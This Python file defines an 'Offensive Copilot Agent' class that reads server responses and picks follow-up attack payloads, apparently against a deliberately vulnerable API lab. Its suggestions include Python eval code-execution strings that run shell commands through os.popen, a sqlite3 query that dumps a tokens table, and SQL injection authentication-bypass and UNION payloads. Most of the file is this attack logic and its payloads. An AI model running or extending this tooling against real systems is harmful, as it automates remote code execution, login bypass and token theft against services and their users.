import re

class TerminalAgent:
    def __init__(self):
        self.name = "Offensive Copilot Agent"

    def analyze_response(self, item, command, status_code, response_body):
        """Inspects server responses, error tracebacks, and database errors to provide precise guidance."""
        analysis = {
            "status": "SUCCESS" if status_code == 200 else "ERROR",
            "suggestion": "Execution completed.",
            "corrected_payload": None,
            "next_steps": []
        }

        body_str = str(response_body)
        target = item.get("target", "").lower()
        vuln = item.get("vulnerability", "").lower()
        method = item.get("method", "").upper()

        # Handle Python /eval Endpoint
        if "eval" in target or "eval" in vuln or "python" in vuln:
            if status_code != 200 or "Failed to execute code" in body_str:
                analysis["suggestion"] = "Python execution error or invalid syntax. Check your expression."
                if "ls" in command.lower():
                    analysis["corrected_payload"] = "__import__('os').popen('ls').read()"
                analysis["next_steps"] = [command, "exec __import__('os').popen('id').read()"]
                return analysis

            if "tokens" in body_str.lower() or "userid" in body_str.lower():
                analysis["suggestion"] = "SUCCESS: Token data or database records retrieved!"
                analysis["next_steps"] = ["exit"]
            else:
                analysis["suggestion"] = "Python expression evaluated successfully."
                analysis["next_steps"] = ["exec __import__('sqlite3').connect('vAPI.db').cursor().execute('SELECT * FROM tokens').fetchall()"]

        # Handle SQL Injection / POST Endpoints (/tokens)
        elif "sql" in vuln or "tokens" in target or method == "POST":
            # Check for SQL syntax errors or tracebacks returned in HTML/JSON
            if "OperationalError" in body_str or "syntax error" in body_str or status_code == 500:
                analysis["suggestion"] = "SQL Syntax Error detected in the backend query! Your payload broke the SQL syntax. Try a cleaner authentication bypass payload."
                analysis["corrected_payload"] = "admin1' OR '1'='1 -- "
                analysis["next_steps"] = [
                    "admin1' OR '1'='1 -- ",
                    "admin' -- ",
                    "admin1' UNION SELECT 1,2,3,4 -- "
                ]
            elif status_code == 200 and ("access" in body_str or "token" in body_str.lower()):
                analysis["suggestion"] = "SUCCESS! SQL Injection Authentication Bypass Successful! Valid token/session response received."
                analysis["next_steps"] = ["exit"]
            elif status_code == 415 or "Invalid Content-type" in body_str:
                analysis["suggestion"] = "HTTP 415: Content-Type must be application/json."
            else:
                analysis["suggestion"] = "Response received. Test SQL authentication bypass with single quotes or SQL comments (--)."
                analysis["next_steps"] = [
                    "admin1' OR '1'='1 -- ",
                    "admin' OR 1=1 -- "
                ]

        return analysis
